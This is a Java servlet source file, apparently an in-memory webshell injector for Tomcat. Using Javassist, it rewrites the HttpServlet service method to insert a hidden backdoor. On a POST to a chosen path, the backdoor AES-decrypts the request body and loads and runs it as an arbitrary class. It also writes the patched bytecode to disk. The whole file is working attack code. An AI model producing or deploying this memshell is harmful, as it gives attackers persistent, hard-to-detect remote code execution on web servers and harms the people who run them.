package lagou.edu.servlet;

import javassist.*;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.*;

public class agentMemshell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\n            byte[] requestBody=null;\n            try {\n                    Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t        Object Decoder = Base64.newInstance();\n                    requestBody=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                } catch (Exception ex) \n                {\n                    Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new Class[0]).invoke(null, new Object[0]);\n                    requestBody=(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
        Map targetClasses = new HashMap();
        Map targetClassJavaxMap = new HashMap();
        targetClassJavaxMap.put("methodName", "service");
        List paramJavaxClsStrList = new ArrayList();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        Class<?> cls = null;
        try {
            ClassPool cPool = ClassPool.getDefault();
            cls = Class.forName("javax.servlet.http.HttpServlet");
            String targetClassName = cls.getName();
            ClassClassPath classPath = new ClassClassPath(cls);
            cPool.insertClassPath(classPath);
            cPool.importPackage("java.lang.reflect.Method");
            cPool.importPackage("javax.crypto.Cipher");
            List paramClsList = new ArrayList();
            Iterator var21 = ((List)((Map)targetClasses.get(targetClassName)).get("paramList")).iterator();

            String methodName;
            while(var21.hasNext()) {
                methodName = (String)var21.next();
                paramClsList.add(cPool.get(methodName));
            }
            CtClass cClass = cPool.get(targetClassName);
            methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
            CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[])paramClsList.toArray(new CtClass[paramClsList.size()]));
            cMethod.insertBefore(shellCode);
            cClass.detach();
            byte[] data = new byte[0];
            data = cClass.toBytecode();
            byteToFile(data);
            Class<?> aClass = cClass.toClass();
        } catch (ClassNotFoundException | NotFoundException | CannotCompileException e) {
            e.printStackTrace();
        }

    }

    public static void byteToFile(byte[] bytes) throws IOException{  //字节转文件
        if(bytes.length == 0){
            return;
        }
        File file = new File("D:\\Java\\tomcat\\apache-tomcat-8.5.68-src\\java\\lagou\\edu\\servlet\\httpServelt.class");
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);
        bufferedOutputStream.write(bytes);
        bufferedOutputStream.close();
        fileOutputStream.close();
    }
}
